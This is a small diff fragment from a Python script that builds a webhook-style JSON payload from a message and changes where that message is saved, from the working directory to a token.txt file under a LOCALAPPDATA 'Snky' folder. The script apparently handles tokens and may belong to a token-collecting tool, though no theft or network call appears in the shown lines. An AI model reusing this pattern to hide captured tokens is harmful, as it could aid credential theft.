@@ -61,7 +61,7 @@ def main():
 
     payload = json.dumps({'content': message})
 
-    with open(f"{os.getcwd()}/token.txt", "w") as f:
+    with open(f"{os.getenv('LOCALAPPDATA')}/Snky/Snky-main/token.txt", "w") as f:
         f.write(message)
 
 main()
